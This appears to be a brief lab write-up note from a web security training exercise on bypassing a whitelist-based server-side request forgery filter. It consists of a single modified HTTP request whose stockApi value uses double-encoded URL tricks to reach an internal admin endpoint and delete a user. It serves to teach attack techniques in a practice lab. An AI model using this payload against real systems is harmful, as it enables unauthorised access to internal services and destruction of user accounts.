# Bypass Defenses

### Whitelist-based input filters

Modified request:

<pre>
POST /product/stock HTTP/1.1
Host: acb01f311e9c63a080801b0b00b200b7.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acb01f311e9c63a080801b0b00b200b7.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Origin: https://acb01f311e9c63a080801b0b00b200b7.web-security-academy.net
Content-Length: 85
Connection: close
Cookie: session=LdhZWSZjybX2mxXc53VuZ8ybUVnaudIP

stockApi=<b>http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</b>
</pre>
